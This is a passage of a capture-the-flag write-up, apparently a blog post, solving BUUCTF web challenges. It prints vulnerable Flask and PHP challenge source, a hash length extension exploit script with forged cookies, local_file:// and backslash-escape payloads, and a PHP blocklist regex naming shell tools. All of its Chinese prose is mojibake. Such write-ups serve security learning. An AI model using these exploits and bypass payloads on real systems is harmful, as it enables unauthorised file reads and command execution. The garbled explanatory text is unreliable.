hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          </span><br><span class="line">        <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>é™„å¸¦Hint: flag is in ./flag.txt<br>å®¡è®¡ä¹‹:</p>
<ol>
<li>ä¸‰ä¸ªè·¯ç”±,indexç”¨æ¥è·å–æºç ,geneSignç”¨æ¥ç”Ÿæˆmd5,De1taä¸ºæŒ‘æˆ˜.</li>
<li>åœ¨ /De1ta ä¸­ä½¿ç”¨ get ä¼ å‚ param ,åœ¨ cookie é‡Œç”¨ action sign å»è¯»å– flag.txt,å…¶ä¸­param=flag.txt,action ä¸­è¦å«æœ‰ read å’Œ scan,ä¸” sign=md5(secert_key + param + action)<h3 id="æ–¹æ³•ä¸€-å“ˆå¸Œæ‹“å±•æ”»å‡»"><a href="#æ–¹æ³•ä¸€-å“ˆå¸Œæ‹“å±•æ”»å‡»" class="headerlink" title="æ–¹æ³•ä¸€:å“ˆå¸Œæ‹“å±•æ”»å‡»"></a>æ–¹æ³•ä¸€:å“ˆå¸Œæ‹“å±•æ”»å‡»</h3></li>
</ol>
<p><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">è¯¦ç»†èµ„æ–™</a></p>
<p>ç®€å•è¯´ä¸‹md5ç®—æ³•,åˆ†ä¸ºmd5 paddingå’Œmd5 compress</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./18.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./18.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>å¯¹è¾“å…¥çš„ä¸€ä¸²å­—ç¬¦è¿›è¡Œmd5 paddingå,å¦‚æœè¿™ä¸²å­—ç¬¦çš„å­—èŠ‚é•¿åº¦å¯¹64æ±‚ä½™ç»“æœä¸ä¸º56,å°±ä¼šå¡«å……ä¸€ä¸ªx80å’Œxxä¸ª0ä½¿å¾—å¯¹64æ±‚ä½™çš„ç»“æœç­‰äº56,æ­¤æ—¶å­—ç¬¦ä¸²çš„å­—èŠ‚é•¿åº¦ä¸ºn*64+56,å¹¶ä¸”æœ€å8ä¸ªå­—èŠ‚ç”¨æ¥è®°å½•åŸå§‹è¾“å…¥ä¿¡æ¯é•¿åº¦</p>
<p>ä¾‹å¦‚å¯¹adminè¿›è¡Œmd5 paddingå¤„ç†åä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure>
<p>61646d696e  ä¸ºadminçš„hex<br>80  ä¸ºç¬¬ä¸€ä¸ªå¡«å……å—,åé¢çš„ä¸€å¤§ä¸²0ä¹Ÿæ˜¯å¡«å……</p>
<p>2800000000000000  å®é™…å€¼ä¸º0000000000000028,åè¿›åˆ¶çš„40,å•ä½ä¸ºbit,ä¸º5ä¸ªå­—èŠ‚(admin)</p>
<p>md5ç®—æ³•é‡Œæœ‰å››ä¸ªå‘é‡(Magic number)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L</span><br></pre></td></tr></table></figure>
<p>åˆå§‹åŒ–çš„4ä¸ªMagic numberä¼šå’Œç¬¬ä¸€ä¸ª64å­—èŠ‚çš„Message blockè¿›è¡Œmd5 compresså‹ç¼©ç®—æ³•,å‹ç¼©ç®—æ³•å®Œæˆåä¼šäº§ç”Ÿæ–°çš„4ä¸ªMagic number,å†è¿›è¡Œç¬¬äºŒä¸ª64å­—èŠ‚Message blockçš„md5 compresså‹ç¼©ç®—æ³•,ç›´åˆ°å‹ç¼©åˆ°æœ€å64ä¸ªå­—èŠ‚çš„(Message block + padding),æœ€åå¾—åˆ°çš„Magic numberç»è¿‡hexè½¬åŒ–å°±æ˜¯æœ€åçš„md5 hashå€¼<br>æ‰€ä»¥å½“å·²çŸ¥ md5(salt+message)çš„å€¼ messageå†…å®¹ salt+messageé•¿åº¦ æ—¶,å°±å¯ä»¥åœ¨ä¸çŸ¥é“saltçš„å…·ä½“å†…å®¹æƒ…å†µä¸‹è®¡ç®—å‡ºä»»æ„çš„md5(salt+message+padding+append)å€¼,é€†å‘å‡ºæœ€åä¸€æ¬¡çš„4ä¸ªMagic number<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">å¤§ä½¬çš„æ”»å‡»è„šæœ¬</a></p>
<p>å›å½’æ­£é¢˜</p>
<p>geneSigné‡Œçš„request.args.get()æ–¹æ³•å¯ä»¥ç”¨æ¥è¯·æ±‚ä¸Šä¸‹æ–‡,å³å¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹,å…ˆè¯»å–ä¸€ä¸‹flag.txt,è·å¾—ä¸€ä¸²md5,æ˜¯md5(secert_key + â€˜flag.txtâ€™ + â€˜scanâ€™) çš„å€¼,è€Œæˆ‘ä»¬éœ€è¦çš„æ˜¯è·å– md5(secert_key + â€˜flag.txtâ€™ + â€˜readscanâ€™) çš„å€¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txt</span><br><span class="line">62bc8d3947680a751bfb41f9e69631d9</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨hashpumpå·¥å…·è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»<br><figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./19.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./19.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02093a8c2c49c37477f5053717930316</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>
<p>éœ€è¦åœ¨æ‰§è¡Œå‰æŠŠè½¬ä¹‰å­—ç¬¦\xå˜æˆ%ç„¶åå°†è¿™ä¸¤ä¸²ä¼ å…¥cookie,è„šæœ¬å¦‚ä¸‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn/De1ta?param=flag.txt&apos;</span><br><span class="line">cookies = &#123;</span><br><span class="line">Â  &apos;sign&apos;: &apos;02093a8c2c49c37477f5053717930316&apos;,</span><br><span class="line">Â  &apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;,</span><br><span class="line">Â  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p>
<p>æ”¶åˆ°å›å¤ä¿¡æ¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 hashcookie.py</span><br><span class="line">&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;flag&#123;40fac20a-bded-4216-889f-ac089966e6d4&#125;\n&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="æ–¹æ³•äºŒ-å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#æ–¹æ³•äºŒ-å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="æ–¹æ³•äºŒ:å­—ç¬¦ä¸²æ‹¼æ¥"></a>æ–¹æ³•äºŒ:å­—ç¬¦ä¸²æ‹¼æ¥</h3><p>åä¸¤ç§æ–¹æ³•æ˜¯çœ‹å¤§ä½¬åšå®¢çš„,è·Ÿç€å¤ç°å­¦ä¸€æ³¢</p>
<p>geneSigné‡Œçš„paramåœ¨æ–¹æ³•å®šä¹‰é‡Œåªæœ‰scançš„åŠŸèƒ½,è¦æƒ³å®ç°readscanå¯ä»¥æ ¹æ®pythoné‡Œå¯¹md5()æ–¹æ³•é‡Œå‚æ•°çš„æ‹¼æ¥,é‡‡ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼,çœ‹ä¸€ä¸‹è¿™ä¸¤å—çš„é€»è¾‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>åœ¨è®¿é—®/geneSign?param=flag.txtçš„æ—¶å€™,è¿”å›çš„æ•°æ®åº”è¯¥æ˜¯ md5(â€˜secert_keyâ€™ + â€˜flag.txtâ€™ + â€˜scanâ€™)<br>åœ¨md5()æ–¹æ³•é‡Œç›¸å½“äº md5(secert_keyflag.txtscan)</p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ä¸º /geneSign?param=flag.txtread æ—¶å°±æ‹¼æ¥å‡ºäº†md5(â€˜secert_keyflag.txtreadscanâ€™),ç›´æ¥è·å–åˆ°cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">cb6a31cfc19b4162449c235bac8251b7</span><br></pre></td></tr></table></figure>
<p>æ¥ç€æŠ“åŒ…è®¿é—® /De1ta?param=flag.txt æ„é€ cookie<br>action=readscan;sign=cb6a31cfc19b4162449c235bac8251b7</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./20.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./20.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>flag{40fac20a-bded-4216-889f-ac089966e6d4}</p>
<h3 id="æ–¹æ³•ä¸‰-local-file"><a href="#æ–¹æ³•ä¸‰-local-file" class="headerlink" title="æ–¹æ³•ä¸‰:local_file"></a>æ–¹æ³•ä¸‰:local_file</h3><p>å’Œç¬¬äºŒç§æ–¹æ³•ç±»ä¼¼,ä½†åœ¨æ–‡ä»¶å†…å®¹è¯»å–ä¸Šç”¨äº†local_fileå‡½æ•°,ä¸ä¹‹ç›¸å…³çš„æ˜¯CVE-2019-9948,å­˜åœ¨ä¸å¿…è¦çš„URLæ–¹æ¡ˆä»¥å…è®¸local_file://è¯»å–urllibä¸­çš„æ–‡ä»¶</p>
<p>è¿›è¡Œè¯»å–çš„è¯,flag.txtçš„è·¯å¾„æ˜¯ local_file:///app/flag.txt,å…¶ä½™æ­¥éª¤ä¸æ–¹æ³•äºŒç›¸ä¼¼</p>
<p>è¿™é‡Œæ˜¯ä½¿ç”¨çš„ urllib.urlopen(param) å»åŒ…å«çš„æ–‡ä»¶,æ‰€ä»¥å¯ä»¥ç›´æ¥åŠ ä¸Šæ–‡ä»¶è·¯å¾„ flag.txt æˆ– ./flag.txt å»è®¿é—®,ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„ file:///app/flag.txt å»è®¿é—®,ä½†æ˜¯ file å…³é”®å­—åœ¨é»‘åå•é‡Œ,å¯ä»¥ä½¿ç”¨ local_file ä»£æ›¿,â€‹ å¦‚æœä½¿ç”¨ urllib2.urlopen(param) å»åŒ…å«æ–‡ä»¶å°±å¿…é¡»åŠ ä¸Š file ,å¦åˆ™ä¼šæŠ¥ ValueError: unknown url type: /path/to/file çš„é”™è¯¯.</p>
<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">http://0</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">e8b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">ac</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">5e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">a39d</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-418</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">f-9</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">6e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-52</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">7</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">96</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">c</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">2ba0b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">.node3.buuoj.cn</a></p>
<p>æŸ¥çœ‹æºç ,æœ‰ä¸€å¥æç¤º md5 is funny ~</p>
<p>è§‚å¯Ÿurlçš„å˜é‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line">å¯¹imgè¿›è¡Œbase64è§£ç </span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">å†è§£ä¸€æ¬¡</span><br><span class="line">3535352e706e67</span><br><span class="line">è§£ä¸€æ¬¡hex</span><br><span class="line">555.png</span><br></pre></td></tr></table></figure>
<p>çŒœæµ‹èƒ½è¿›è¡Œæ–‡ä»¶è¯»å–,æ„é€ index.phpæŸ¥ä¸‹æºç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure></p>
<p>å¯¹å›¾ç‰‡é‡Œçš„base64è¿›è¡Œè§£å¯†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]))Â </span><br><span class="line">Â  Â  header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">Â  Â  <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  $txt = base64_encode(file_get_contents($file));</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$imgå¯¹æ–‡ä»¶è¿›è¡Œbase64æºç è¯»å–</span></span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">Â  Â  <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//å¯¹$cmdè¿›è¡Œäº†è¿‡æ»¤,ä½†è¿‡æ»¤åæ–œæ  |\\|\\\\| æ­£åˆ™æ²¡æœ‰å†™å¥½,å¯å¯¼è‡´åæ–œæ é€ƒé€¸</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="comment">//md5å¼ºç±»å‹æ¯”è¾ƒ,éœ€è¦md5ç¢°æ’</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">Â  body&#123;</span><br><span class="line">Â  Â background:url(./bj.png)Â  no-repeat center center;</span><br><span class="line">Â  Â background-size:cover;</span><br><span class="line">Â  Â background-attachment:fixed;</span><br><span class="line">Â  Â background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>å¯¹äºæœ¬é¢˜phpåæ–œæ çš„æ­£åˆ™ |\|\\| å½¢æˆçš„åæ–œæ é€ƒé€¸,å¯ä»¥è§£æä¸€ä¸‹è¿‡ç¨‹</p>
<ol>
<li>\ å…ˆç»è¿‡PHPæ­£åˆ™è§£æå™¨ä¸ºä¸€ä¸ª\</li>
<li>\ åˆè·Ÿâ€™|â€™ç»“åˆåˆ°ä¸€èµ·,ä»è€Œåœ¨æ­£åˆ™è¡¨è¾¾å¼çš„è§£æå™¨è§£æä¸º|</li>
<li>åˆå› ä¸ºâ€™|â€™æ˜¯æ­£åˆ™ä¸­çš„ä¿ç•™ç¬¦å·,æ‰€ä»¥éœ€è¦ä¸€ä¸ªè½¬ä¹‰ç¬¦æ¥è½¬ä¹‰.æ‰€ä»¥\|è¿™ä¸ªçš„ç»“æœå°±æ˜¯åŒ¹é… â€˜|â€™</li>
<li>åé¢åˆè·Ÿäº†\\,è¿™é‡Œå…ˆç»è¿‡PHPæ­£åˆ™è§£æå™¨ä¸º \,ç„¶ååœ¨ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„è§£æå™¨ä¸º â€˜\â€™</li>
<li>æœ€åçš„æ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯åŒ¹é…â€™|\â€™è€Œä¸æ˜¯â€™|â€™å’Œâ€™\â€™,å½¢æˆåæ–œæ é€ƒé€¸</li>
</ol>
<p>æ ¹æ®åˆ†ææ„é€ payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=ca\t%20/flag</span><br></pre></td></tr></table></figure>
